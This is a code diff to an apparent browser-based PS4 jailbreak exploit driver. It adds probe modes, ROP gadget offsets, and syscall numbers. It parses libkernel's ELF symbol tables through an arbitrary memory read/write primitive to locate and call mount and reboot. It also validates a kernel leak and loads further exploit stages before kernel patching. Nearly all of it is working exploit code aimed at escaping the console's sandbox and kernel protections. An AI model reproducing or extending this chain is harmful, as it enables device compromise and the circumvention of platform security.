@@ -1,4 +1,4 @@
-import { establishPrimitive } from "./core.js?v=10";
+import { establishPrimitive } from "./core.js?v=28";
 import {
   installWindowP,
   pairStatus,
@@ -7,7 +7,7 @@ import {
   addrNumber,
 } from "./mem.js";
 import { int64 } from "./int64.js";
-import { offsetsFor } from "./ps4_offsets.js";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=5";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -16,20 +16,25 @@ let passCount = 0,
   failCount = 0;
 let armedEver = false;
 const params = new URLSearchParams(location.search);
+const RUN_ID = Date.now().toString(36) + "-" + Math.floor(Math.random() * 0x100000).toString(16);
+const PROBE_MODE = params.get("probe") === "1";
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
-// ?t=1 opts IN the fire-and-forget /t telemetry POSTs. On GitHub Pages the
+// ?t=1 (or telemetry=1) opts IN the /t telemetry POSTs. On GitHub Pages the
 // endpoint 404s, so defaulting off keeps hundreds of useless XHRs out of
-// the timing-sensitive exploit phases on the PS4.
-const TELEMETRY = params.get("t") === "1";
-function post(tag, detail) {
+// the timing-sensitive exploit phases on the PS4. `synchronous` marks the
+// calls upstream made blocking so ordering survives when telemetry is on.
+const TELEMETRY =
+  params.get("t") === "1" || params.get("telemetry") === "1";
+function post(tag, detail, synchronous = false) {
   if (!TELEMETRY) return;
+
   try {
     const x = new XMLHttpRequest();
-    x.open("POST", "/t", true);
+    x.open("POST", "/t", !synchronous);
     x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x.send(
-      "PS4-JB&tag=" +
+      "PS4-JB&run=" + encodeURIComponent(RUN_ID) + "&tag=" +
         encodeURIComponent(tag) +
         "&detail=" +
         encodeURIComponent(String(detail == null ? "" : detail)),
@@ -60,6 +65,108 @@ function terse(s) {
 }
 
 const SHOW_LOG = params.get("log") === "1";
+
+/* UPDATE_RAM_BOX */
+const ramBox =
+  document.getElementById("ramBox");
+
+function formatMB(bytes) {
+  bytes = Number(bytes || 0);
+
+  if (bytes <= 0) {
+    return "0MB";
+  }
+
+  return (
+    (bytes / (1024 * 1024)).toFixed(2) +
+    "MB"
+  );
+}
+
+function updateRamBox() {
+  if (!ramBox) {
+    return;
+  }
+
+  let heapText =
+    "JS heap: N/A";
+
+  try {
+    if (
+      performance &&
+      performance.memory
+    ) {
+      const used =
+        Number(
+          performance.memory.usedJSHeapSize || 0,
+        );
+
+      const limit =
+        Number(
+          performance.memory.jsHeapSizeLimit || 0,
+        );
+
+      if (limit > 0) {
+        const percent =
+          used / limit * 100;
+
+        heapText =
+          "JS heap: " +
+          percent.toFixed(1) +
+          "% (" +
+          formatMB(used) +
+          "/" +
+          formatMB(limit) +
+          ")";
+      } else {
+        heapText =
+          "JS heap: " +
+          formatMB(used);
+      }
+    }
+  } catch (ramError) {
+    heapText =
+      "JS heap: error";
+  }
+
+  let coreText =
+    "core: N/A";
+
+  try {
+    const info =
+      globalThis.__CORE_MEM_INFO;
+
+    if (info) {
+      coreText =
+        "core: slots=" +
+        info.slots +
+        " drain=" +
+        info.drainCount +
+        "x" +
+        formatMB(info.drainSize) +
+        " est=" +
+        formatMB(info.estimatedBytes) +
+        " mem=" +
+        info.memLevel;
+    }
+  } catch (coreError) {
+    coreText =
+      "core: error";
+  }
+
+  ramBox.textContent =
+    heapText + " | " + coreText;
+}
+
+if (ramBox) {
+  updateRamBox();
+
+  setInterval(
+    updateRamBox,
+    500,
+  );
+}
+
 if (SHOW_LOG && document.body) document.body.className = "log";
 function finishUI(ok) {
   if (SHOW_LOG || !document.body) return;
@@ -80,14 +187,32 @@ function classifyLine(l) {
   if (/\bOK\b|\bPASS\b|PASS=|ACHIEVED|RUNNING|ARMED/i.test(l)) return "ok";
   return "";
 }
-function mark(tag, detail) {
+function mark(tag, detail, synchronous = false) {
   const raw = detail;
   detail = terse(detail);
-  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+
+  lines.push(
+    tag +
+      (detail == null || detail === "" ? "" : "  " + detail),
+  );
+
+  // Bound the log at 600 lines (upstream cap). Each rendered line costs
+  // exactly two DOM nodes, so trimming the array also trims the DOM.
+  const over = lines.length - 600;
+  if (over > 0) {
+    lines.splice(0, over);
+    logRendered -= over;
+    if (logRendered < 0) logRendered = 0;
+    if (SHOW_LOG && outEl) {
+      for (let i = 0; i < over * 2 && outEl.firstChild; i++)
+        outEl.removeChild(outEl.firstChild);
+    }
+  }
+
+  // Append only the lines not already in the DOM. Rebuilding the whole log
+  // on every mark() was O(n^2) parse+layout work on the PS4, which visibly
+  // stalls long ?log=1 runs.
   if (SHOW_LOG && outEl) {
-    // Append only the lines not already in the DOM. Rebuilding the whole
-    // log through innerHTML on every mark() was O(n^2) parse+layout work
-    // on the PS4, which visibly stalls long ?log=1 runs.
     for (; logRendered < lines.length; logRendered++) {
       const l = lines[logRendered];
       const c = classifyLine(l);
@@ -103,8 +228,11 @@ function mark(tag, detail) {
     }
     outEl.scrollTop = outEl.scrollHeight;
   }
-  post(tag, raw);
+
+  post(tag, raw, synchronous);
 }
+
+function markSync(tag, detail) { mark(tag, detail, true); }
 
 function trace(tag, detail) {
   if (VERBOSE) mark(tag, detail);
@@ -114,16 +242,6 @@ function state(t, c) {
   if (!SHOW_LOG || !stateEl) return;
   stateEl.textContent = t;
   stateEl.className = c || "";
-}
-function check(name, ok, detail) {
-  if (ok) {
-    passCount++;
-    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
-  } else {
-    failCount++;
-    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
-  }
-  return ok;
 }
 
 // ---- windowed bulk transfers through the carrier window ----
@@ -179,6 +297,16 @@ function scanStubs(baseNum, limit, visit) {
     }
   }
 }
+function check(name, ok, detail) {
+  if (ok) {
+    passCount++;
+    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
+  } else {
+    failCount++;
+    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
+  }
+  return ok;
+}
 
 const SYS = {
   getpid: 20,
@@ -200,11 +328,14 @@ const SYS = {
   getegid: 43,
   aio_multi_wait: 663,
   aio_multi_cancel: 666,
-  aio_submit_cmd: 669,
+    aio_submit_cmd: 669,
   write: 4,
   sysctl: 202,
   kill: 37,
   getppid: 39,
+  kqueue: 362,
+  kevent: 363,
+  jitshm_create: 533,
 };
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
 const keepAlive = [];
@@ -229,7 +360,66 @@ let allDone = false,
     mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      state("no offsets for this firmware", "bad");
+      /* NONPS4-DEBUG */
+      try {
+        document.body.classList.add("log");
+      } catch (e) {}
+
+      state("not a PS4 browser - debug mode", "warn");
+
+      mark(
+        "NONPS4-DEBUG",
+        "ua=" + (navigator.userAgent || "unknown"),
+      );
+
+      try {
+        mark(
+          "NONPS4-OFFSETS",
+          "supported=" + Object.keys(PS4).join(","),
+        );
+      } catch (e) {
+        mark("NONPS4-OFFSETS", "error=" + String(e));
+      }
+
+      try {
+        const off14 = PS4["14.00"];
+
+        if (off14) {
+          mark(
+            "NONPS4-14",
+            "present " +
+            "webkit=" + off14.wk_expm1_builtin +
+            " poprdi=0x" + off14.wk_POP_RDI_RET.toString(16) +
+            " poprsi=0x" + off14.wk_POP_RSI_RET.toString(16) +
+            " poprdx=0x" + off14.wk_POP_RDX_RET.toString(16),
+          );
+        } else {
+          mark("NONPS4-14", "entry=missing");
+        }
+      } catch (e) {
+        mark("NONPS4-14", "error=" + String(e));
+      }
+
+      try {
+        const info = globalThis.__CORE_MEM_INFO;
+
+        if (info) {
+          mark(
+            "NONPS4-CORE",
+            "hx1400=" + info.hx1400 +
+            " memLevel=" + info.memLevel +
+            " slots=" + info.slots +
+            " drain=" + info.drainCount +
+            " est=" + info.estimatedBytes,
+          );
+        } else {
+          mark("NONPS4-CORE", "info=missing");
+        }
+      } catch (e) {
+        mark("NONPS4-CORE", "error=" + String(e));
+      }
+
+      allDone = true;
       return;
     }
     const fwKey = key || "unknown";
@@ -241,7 +431,8 @@ let allDone = false,
 
     const KEEP_JB = params.get("keepjb") === "1";
 
-    const NEED_K = [
+    const HX1400_MODE = params.get("hx1400") === "1";
+    const NEED_K = HX1400_MODE ? [] : [
       "k_idt_rsvd",
       "k_oid_kern_file",
       "k_oid_maxfilesperproc",
@@ -257,7 +448,7 @@ let allDone = false,
     if (
       !check(
         "kernel-table-present",
-        missing.length === 0,
+        missing.length === 0 || PROBE_MODE,
         "fw=" +
           fwKey +
           " missing=[" +
@@ -272,13 +463,13 @@ let allDone = false,
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = off.payload || "payload.bin";
-    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
+    const needPatch = HX1400_MODE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
     if (
       !check(
         "kpatch-table-present",
-        !DO_PATCH || needPatch.length === 0,
+        !DO_PATCH || PROBE_MODE || needPatch.length === 0,
         "missing=[" +
           needPatch.join(",") +
           "] blob=" +
@@ -287,13 +478,13 @@ let allDone = false,
       )
     )
       return;
-    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter(
+    const needPl = HX1400_MODE ? [] : ["wk___imp_pthread_create", "k_pthread_create"].filter(
       (k) => off[k] === undefined,
     );
     if (
       !check(
         "payload-table-present",
-        !DO_PAYLOAD || needPl.length === 0,
+        !DO_PAYLOAD || PROBE_MODE || needPl.length === 0,
         "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE,
       )
     )
@@ -301,17 +492,29 @@ let allDone = false,
     mark("FW-STATUS", off.fw_status || "none");
     mark(
       "FW-KTABLE",
-      "idt_rsvd=0x" +
-        off.k_idt_rsvd.toString(16) +
-        " prison0=0x" +
-        off.k_prison0.toString(16) +
-        " rootvnode=0x" +
-        off.k_rootvnode.toString(16) +
-        " kpatch=" +
+      "idt_rsvd=" +
+        (
+          off.k_idt_rsvd === undefined
+            ? "undefined"
+            : "0x" + off.k_idt_rsvd.toString(16)
+        ) +
+      " prison0=" +
+        (
+          off.k_prison0 === undefined
+            ? "undefined"
+            : "0x" + off.k_prison0.toString(16)
+        ) +
+      " rootvnode=" +
+        (
+          off.k_rootvnode === undefined
+            ? "undefined"
+            : "0x" + off.k_rootvnode.toString(16)
+        ) +
+      " kpatch=" +
         KPATCH_FILE +
-        " payload=" +
+      " payload=" +
         PAYLOAD_FILE +
-        " src=ps4_offsets.js",
+      " src=ps4_offsets.js",
     );
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
@@ -378,14 +581,26 @@ let allDone = false,
     await new Promise((r) => setTimeout(r, 0));
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
-    const carrier = await establishPrimitive({
-      maxAttempts: 6,
-      onEvent: (t, d, a) =>
-        (PRIMITIVE_LOUD.test(t) ? mark : trace)(
-          t,
-          (a != null ? "[" + a + "] " : "") + (d || ""),
-        ),
-    });
+    const entryEvents = [];
+    let entryCount = 0;
+    let carrier;
+    try {
+      carrier = await establishPrimitive({
+        maxAttempts: 8,
+        onEvent: (t, d, a) => {
+          entryCount++;
+          entryEvents.push(t + (a == null ? "" : "[" + a + "]"));
+          if (entryEvents.length > 8) entryEvents.shift();
+          (PRIMITIVE_LOUD.test(t) ? mark : trace)(
+            t,
+            (a != null ? "[" + a + "] " : "") + (d || ""),
+          );
+        },
+      });
+    } finally {
+      mark("CORE-ENTRY-SUMMARY", "events=" + entryCount +
+        " last=" + entryEvents.join(","));
+    }
     installWindowP(carrier, { promote: false });
     if (!window.p) throw new Error("window.p was not installed");
     p = window.p;
@@ -405,7 +620,28 @@ let allDone = false,
     );
     const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
     const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
-    const libkernelBase = errorFn.sub32(off.k__error);
+    let libkernelBase = errorFn.sub32(off.k__error);
+
+    if (HX1400_MODE || PROBE_MODE) {
+      const libkernelAdjust =
+        libkernelBase.low & 0x3fff;
+
+      if (libkernelAdjust !== 0) {
+        libkernelBase =
+          libkernelBase.sub32(
+            libkernelAdjust,
+          );
+
+        mark(
+          "HX1400-LIBKERNEL-ALIGN",
+          "adjust=0x" +
+          libkernelAdjust.toString(16) +
+          " base=" +
+          libkernelBase,
+        );
+      }
+    }
+
     mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
     const aligned = (v) => v.hi > 0 && (v.low & 0x3fff) === 0;
     if (
@@ -416,20 +652,6 @@ let allDone = false,
       )
     )
       return;
-
-    function findStub(num) {
-      let found = null;
-      scanStubs(
-        addrNumber(libkernelBase),
-        off.k_scan_stage1,
-        function (n, o) {
-          if (n !== num) return false;
-          found = libkernelBase.add32(o);
-          return true;
-        },
-      );
-      return found;
-    }
 
     const G = {};
     const GAD = [
@@ -525,6 +747,136 @@ let allDone = false,
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
     if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
       return;
+
+    function findStub(num) {
+      let found = null;
+      scanStubs(
+        addrNumber(libkernelBase),
+        off.k_scan_stage1,
+        function (n, o) {
+          if (n !== num) return false;
+          found = libkernelBase.add32(o);
+          return true;
+        },
+      );
+      return found;
+    }
+
+    if (PROBE_MODE) {
+      const rd4 = (a) => p.read4(a) >>> 0;
+      const B = libkernelBase;
+      const symHash = (name) => {
+        let h = 0;
+        for (let i = 0; i < name.length; i++)
+          h = (h << 4) + name.charCodeAt(i);
+        const g = h & 0xf0000000;
+        if (g) h ^= g >>> 24;
+        return (h & ~g) >>> 0;
+      };
+      const cstrAt = (addr) => {
+        let out = "";
+        for (let i = 0; i < 64; i++) {
+          const b = p.read1(addr.add32(i));
+          if (b === 0) break;
+          out += String.fromCharCode(b);
+        }
+        return out;
+      };
+      const phoff = p.read8(B.add32(0x20));
+      const phentsize = rd4(B.add32(0x36)) & 0xffff;
+      const phnum = rd4(B.add32(0x38)) & 0xffff;
+      let dynV = null;
+      for (let k = 0; k < phnum; k++) {
+        const ph = B.add32(phoff).add32(k * phentsize);
+        if (rd4(ph) === 2) {
+          dynV = p.read8(ph.add32(0x10));
+          break;
+        }
+      }
+      let strV = null,
+        symV = null,
+        hashV = null,
+        symEnt = 24;
+      if (dynV) {
+        for (let k = 0; k < 4096; k++) {
+          const tag = p.read8(dynV.add32(k * 16));
+          const val = p.read8(dynV.add32(k * 16 + 8));
+          if (tag.low === 0 && tag.hi === 0) break;
+          if (tag.low === 5) strV = val;
+          else if (tag.low === 6) symV = val;
+          else if (tag.low === 4) hashV = val;
+          else if (tag.low === 11) symEnt = val.low >>> 0;
+        }
+      }
+      check(
+        "elf-dynamic-parsed",
+        !!dynV && !!strV && !!symV && !!hashV,
+        "dyn=" + dynV + " strtab=" + strV + " symtab=" + symV + " hash=" + hashV,
+      );
+      let mountStub = null,
+        mountNum = -1;
+      if (dynV && strV && symV && hashV) {
+        const nbucket = rd4(B.add32(hashV));
+        const h = symHash("mount");
+        let idx = rd4(B.add32(hashV).add32(8 + (h % nbucket) * 4));
+        let guard = 0;
+        while (idx !== 0 && guard++ < 4096) {
+          const sym = B.add32(symV).add32(idx * symEnt);
+          if (cstrAt(B.add32(strV).add32(rd4(sym))) === "mount") {
+            mountStub = B.add32(p.read8(sym.add32(8)));
+            const sv = p.read8(mountStub);
+            if ((sv.low & 0x00ffffff) === 0xc0c748 && sv.hi >>> 24 === 0x49)
+              mountNum =
+                ((sv.low >>> 24) | ((sv.hi & 0x00ffffff) << 8)) >>> 0;
+            break;
+          }
+          idx = rd4(B.add32(hashV).add32(8 + nbucket * 4 + idx * 4));
+        }
+      }
+      check(
+        "mount-sym-found",
+        !!mountStub,
+        mountStub
+          ? "stub=" + mountStub + " syscall=" + mountNum
+          : "mount NOT exported by libkernel .dynsym",
+      );
+      if (mountStub && mountNum >= 0) {
+        const strBuf = (txt) => {
+          const ab = new ArrayBuffer(txt.length + 1);
+          keepAlive.push(ab);
+          const u8 = new Uint8Array(ab);
+          for (let i = 0; i < txt.length; i++) u8[i] = txt.charCodeAt(i);
+          u8[txt.length] = 0;
+          return ab;
+        };
+        const typeAb = strBuf("ufs");
+        const dirAb = strBuf("/mnt/usb0");
+        const specAb = strBuf("/dev/da0s1");
+        const argsAb = new ArrayBuffer(0x20);
+        keepAlive.push(argsAb);
+        put(new DataView(argsAb), 0x00, bufAddr(specAb));
+        const mrv = callAddr(mountStub, [
+          bufAddr(typeAb),
+          bufAddr(dirAb),
+          1,
+          bufAddr(argsAb),
+        ]).i32;
+        const merr = mrv !== 0 ? errno() : 0;
+        mark(
+          "PROBE-MOUNT",
+          "mount(syscall=" +
+            mountNum +
+            ",ufs,/mnt/usb0,RDONLY,/dev/da0s1) rv=" +
+            mrv +
+            " errno=" +
+            merr +
+            " (2=ENOENT-no-usb 1=EPERM-sandbox 0=mounted?!)",
+        );
+      }
+      mark("PROBE-DONE", "mount reachability probed; stopping");
+      return;
+    }
+
 
     function bufAddr(ab) {
       const c = p.leakval(ab);
@@ -628,6 +980,101 @@ let allDone = false,
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
+    function dynsymLookup(name) {
+      const B = libkernelBase;
+      const rd4 = (a) => p.read4(a) >>> 0;
+      const rd8 = (a) => p.read8(a);
+      if (!globalThis.__elf) {
+        const phoff = rd8(B.add32(0x20));
+        const phentsize = rd4(B.add32(0x36)) & 0xffff;
+        const phnum = rd4(B.add32(0x38)) & 0xffff;
+        let dynV = null;
+        for (let k = 0; k < phnum; k++) {
+          const ph = B.add32(phoff).add32(k * phentsize);
+          if (rd4(ph) === 2) { dynV = rd8(ph.add32(0x10)); break; }
+        }
+        let strV = null, symV = null, hashV = null, symEnt = 24;
+        for (let k = 0; k < 4096; k++) {
+          const tag = rd8(dynV.add32(k * 16));
+          const val = rd8(dynV.add32(k * 16 + 8));
+          if (tag.hi === 0 && tag.low === 0) break;
+          if (tag.low === 5) strV = val;
+          else if (tag.low === 6) symV = val;
+          else if (tag.low === 4) hashV = val;
+          else if (tag.low === 11) symEnt = val.low >>> 0;
+        }
+        globalThis.__elf = { strV, symV, hashV, symEnt };
+      }
+      const E = globalThis.__elf;
+      let h = 0;
+      for (let i = 0; i < name.length; i++) h = (h << 4) + name.charCodeAt(i);
+      const g = h & 0xf0000000;
+      if (g) h ^= g >>> 24;
+      h &= ~g;
+      const B2 = libkernelBase;
+      const nb = (a) => (p.read4(a) >>> 0);
+      const nbucket = nb(B2.add32(E.hashV));
+      let idx = nb(B2.add32(E.hashV).add32(8 + (h % nbucket) * 4));
+      let guard = 0;
+      while (idx !== 0 && guard++ < 4096) {
+        const sym = B2.add32(E.symV).add32(idx * E.symEnt);
+        const nameOff = nb(sym);
+        let s = "";
+        for (let i = 0; i < 64; i++) {
+          const ch = p.read1(B2.add32(E.strV).add32(nameOff + i));
+          if (ch === 0) break;
+          s += String.fromCharCode(ch);
+        }
+        if (s === name) return B2.add32(p.read8(sym.add32(8)));
+        idx = nb(B2.add32(E.hashV).add32(8 + nbucket * 4 + idx * 4));
+      }
+      return null;
+    }
+    function bigRed(msg) {
+      try {
+        let d = document.getElementById("bigred");
+        if (!d) {
+          d = document.createElement("div");
+          d.id = "bigred";
+                        d.style.cssText =
+            "position:fixed;left:0;top:0;width:100%;height:100%;background:#000;color:#ff2222;" +
+            "z-index:999999;font-size:26px;font-weight:bold;text-align:center;" +
+            "padding-top:38%;font-family:sans-serif;white-space:pre-wrap;line-height:1.4;";
+          document.body.appendChild(d);
+        }
+        d.textContent = msg;
+      } catch (e) {}
+    }
+    let restartAdvised = false;
+    async function adviseRestart(why) {
+      if (restartAdvised) return;
+      restartAdvised = true;
+            mark(
+        "RESTART-NEEDED",
+        why + " -- FULL power off the console (not Rest Mode), then power on",
+      );
+      bigRed("RESTART REQUIRED\n\n" + why + "\n\nFULL power off (not Rest Mode), then power on");
+      try {
+        if (!p || !callAddr || !libkernelBase) {
+          mark("RESTART-MANUAL", "no memory primitive - reboot by hand");
+          return;
+        }
+        const rb = dynsymLookup("reboot");
+        if (!rb) {
+          mark("RESTART-MANUAL", "reboot not exported by libkernel - reboot by hand");
+          return;
+        }
+        mark("RESTART-AUTO", "trying reboot() via " + rb);
+        const rv = callAddr(rb, [0, 0]).i32;
+        mark(
+          "RESTART-AUTO",
+          "reboot() returned " + rv + " (sandbox blocked it) - reboot by hand",
+        );
+      } catch (e) {
+        mark("RESTART-MANUAL", "auto-reboot failed: " + (e && e.message) + " - reboot by hand");
+      }
+    }
+
     async function relaunchPayload() {
       let blob = null;
       try {
@@ -677,7 +1124,153 @@ let allDone = false,
       );
     }
 
-    const pid = sc(SYS.getpid).i32;
+    
+    if (params.get("mini_only") === "1") {
+      try {
+        const mini = await import("./hx_kevent.js?v=stage10s-1");
+        const ok = await mini.runMini({
+          p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
+          webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
+          stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
+          mark: mark, markSync: markSync, trace: trace, state: state, check: check,
+          fetchFile: async function (path) {
+            const response = await fetch(path);
+            if (!response.ok) throw new Error(path + " HTTP " + response.status);
+            return new Uint8Array(await response.arrayBuffer());
+          },
+        });
+        mark("MINI-FINAL", "executed_and_readback=" + ok);
+        allDone = true;
+        finishUI(ok === true);
+        return;
+      } catch (e) {
+        mark("MINI-ERROR", String(e));
+        allDone = true;
+        finishUI(false);
+        return;
+      }
+    }
+
+    if (params.get("hx1400") === "1") {
+      try {
+        const hx = await import("./hx1400_port.js?v=stage10s-1");
+        if (!hx || typeof hx.runHx1400 !== "function") {
+          mark(
+            "HX1400-BAD-MODULE",
+            "runHx1400 missing - stale cached module? bump v and hard reload",
+          );
+          allDone = true;
+          finishUI(false);
+          return;
+        }
+
+        if (params.get("kv") === "1") {
+          mark("KV-START", "entering kv path");
+          try {
+            await hx.runHx1400({
+              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
+              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
+              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
+              mark: mark, trace: trace, state: state, check: check,
+              fetchFile: async function (path) {
+                const response = await fetch(path);
+                if (!response.ok) throw new Error(path + " HTTP " + response.status);
+                return new Uint8Array(await response.arrayBuffer());
+              },
+            });
+            if (!globalThis.__HX_KBASE) {
+              let kn = 0;
+              try { kn = parseInt(sessionStorage.getItem("kv-kbase-retry") || "0", 10) || 0; } catch (e) {}
+              if (kn < 2) {
+                try { sessionStorage.setItem("kv-kbase-retry", String(kn + 1)); } catch (e) {}
+                mark("KV-RETRY", "route-leak found no kernel pointers; page reload " + (kn + 1) + "/2 -- if it keeps failing, FULL power off the console");
+                setTimeout(() => { try { location.reload(); } catch (e) {} }, 600);
+                return;
+              }
+              try { sessionStorage.removeItem("kv-kbase-retry"); } catch (e) {}
+                     bigRed("RESTART REQUIRED\n\nRoute leak found no kernel pointers.\nFULL power off (not Rest Mode), power on,\nthen run again. Repeat until it passes.");
+              allDone = true;
+              finishUI(false);
+              return;
+            }
+            try { sessionStorage.removeItem("kv-kbase-retry"); } catch (e) {}
+            const kvb = await import("./hx_kevent.js?v=stage10s-1");
+            const kvOk = await kvb.runKevent({
+              p: p, sc: sc, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
+              webkitBase: webkitBase, libkernelBase: libkernelBase, G: G,
+              stubAddr: stubAddr, int64: int64, params: params, keepAlive: keepAlive,
+              mark: mark, markSync: markSync, trace: trace, state: state, check: check,
+              fetchFile: async function (path) {
+                const response = await fetch(path);
+                if (!response.ok) throw new Error(path + " HTTP " + response.status);
+                return new Uint8Array(await response.arrayBuffer());
+              },
+              kbase: globalThis.__HX_KBASE,
+            });
+            allDone = true;
+            finishUI(kvOk === true);
+            return;
+          } catch (kvError) {
+            mark(
+              "KV-THREW",
+              (kvError && kvError.message ? kvError.message : String(kvError)) +
+                " :: " +
+                (kvError && kvError.stack ? String(kvError.stack).slice(0, 400) : "no-stack"),
+            );
+            allDone = true;
+            return;
+          }
+        }
+        const hxOk = await hx.runHx1400({
+          p: p,
+          sc: sc,
+          callAddr: callAddr,
+          bufAddr: bufAddr,
+          errno: errno,
+          webkitBase: webkitBase,
+          libkernelBase: libkernelBase,
+          G: G,
+          stubAddr: stubAddr,
+          int64: int64,
+          params: params,
+          keepAlive: keepAlive,
+          mark: mark,
+          trace: trace,
+          state: state,
+          check: check,
+          fetchFile: async function (path) {
+            const response = await fetch(path);
+
+            if (!response.ok) {
+              throw new Error(
+                path + " HTTP " + response.status,
+              );
+            }
+
+            return new Uint8Array(
+              await response.arrayBuffer(),
+            );
+          },
+        });
+
+        allDone = true;
+        finishUI(hxOk === true);
+      } catch (hxError) {
+        mark(
+          "HX1400-THREW",
+          hxError && hxError.message
+            ? hxError.message
+            : String(hxError),
+        );
+
+        allDone = true;
+        finishUI(false);
+      }
+
+      return;
+    }
+
+const pid = sc(SYS.getpid).i32;
     check(
       "chain-reaches-kernel",
       pid > 0,
@@ -2034,6 +2627,14 @@ let allDone = false,
     // kernel, so from here a failure must NOT auto-reload. Reset the counter
     // so the next manual run starts fresh.
     clearRetry();
+
+    if (PROBE_MODE) {
+      mark(
+        "PROBE-DONE",
+        "leak primitive validated on this FW - kernel bug is ALIVE; stopping before any kernel write",
+      );
+      return;
+    }
 
     const IDT = new int64(0x00001a00, 0xffffff80);
     const GATE_SZ = 16;
@@ -3860,6 +4461,7 @@ let allDone = false,
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
     state("threw", "bad");
+    try { await adviseRestart("exploit threw"); } catch (eR) {}
   } finally {
     try {
       if (jbRestoreHook) jbRestoreHook("finally");
@@ -3893,6 +4495,11 @@ let allDone = false,
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
     } catch (e) {}
+    try {
+      if (!payloadRunning && !jailbroken && (failCount > 0 || !allDone)) {
+        await adviseRestart("run incomplete pass=" + passCount + " fail=" + failCount);
+      }
+    } catch (eA) {}
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
